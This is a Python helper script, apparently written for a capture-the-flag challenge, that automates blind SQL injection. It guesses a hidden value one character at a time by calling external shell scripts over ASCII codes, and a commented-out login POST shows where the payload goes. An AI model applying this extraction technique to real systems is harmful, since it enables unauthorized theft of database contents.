import requests
import json
import string
import subprocess

    

all_result_name_list = []

# columnIndex: sql 出來的結果裡面的第幾個
# i :目前猜的字元值
# charIndex :目前這個string裡面的第幾個
columnIndex=0
flag=True
curString=""
charIndex=1
charACSIIValue=[]
while flag == True:
    flag = False
    for i in range(30,256):
        print("curIndex",charIndex," value",i)
        print("curString",curString)
        # my_data = {'username': "%5C",'password':genPayload(charIndex,i)}
        # # 將資料加入 POST 請求中
        # r = requests.post(url, json= my_data)
        # print("r.text",r.text)
        # result = r.text
        # 些改這邊成要run 的script
        # rc = subprocess.run(["./getTableName.sh",str(charIndex),str(i),str(columnIndex)],capture_output=True)
        # rc = subprocess.run(["./getColNameFLAG.sh",str(charIndex),str(i),str(columnIndex)],capture_output=True)
        rc = subprocess.run(["./getValue_FLAG.sh",str(charIndex),str(i),str(columnIndex)],capture_output=True)
        # print("rc",rc)
        print("rc.returncode",rc.returncode)
        if rc.returncode == 0:
            print("sub said welcom")
        else:
            if i==30:
                print("----final")
                print("charAscii",charACSIIValue)
                all_result_name_list.append(curString)
                if charIndex==1:
                    print("all_result_name_list",all_result_name_list)
                    exit()
                else:
                    flag=False
                    break
            else:
                print("child said fail")
                charACSIIValue.append(i)
                curString+=chr(i)
                flag=True
                break
    charIndex+=1

